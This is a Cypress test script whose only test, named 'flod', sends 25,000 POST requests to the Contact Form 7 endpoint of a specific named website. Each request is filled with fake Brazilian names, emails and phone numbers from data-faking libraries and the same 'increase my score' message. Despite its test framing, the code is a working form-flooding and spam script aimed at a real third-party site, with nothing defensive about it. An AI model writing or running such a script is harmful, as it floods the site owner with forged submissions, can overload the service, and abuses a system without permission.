/// <reference types="cypress" />

const Leite = require('leite')
const leite = new Leite()

const faker = require('faker-br')

context('Actions', () => {
   
    it('flod', () => {
        var genArr = Array.from({length:25000},(v,k)=>k+1)
        cy.wrap(genArr).each((index) => {
            cy.request({
                method: 'POST',
                url: 'https://pontocertoscore.com/wp-json/contact-form-7/v1/contact-forms/1848/feedback',
                headers: { 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundarygWXl9k8ytAGp6Q8r' },
                body: {
                    silent: true,
                    _wpcf7: 1848,
                    _wpcf7_locale: 'pt_BR',
                    _wpcf7_container_post: 1660,
                    names: leite.pessoa.nome(),
                    email: leite.pessoa.email(),
                    phone: faker.phone.phoneNumber(),
                    message: "Quero aumentar meu score"
                }
            }).then((response) => {
                expect(response).property('status').to.equal(200)
                expect(response).to.have.property('body')
                expect(response.body).to.have.property('message')
            })
            cy.log(index)
        })    
    })

})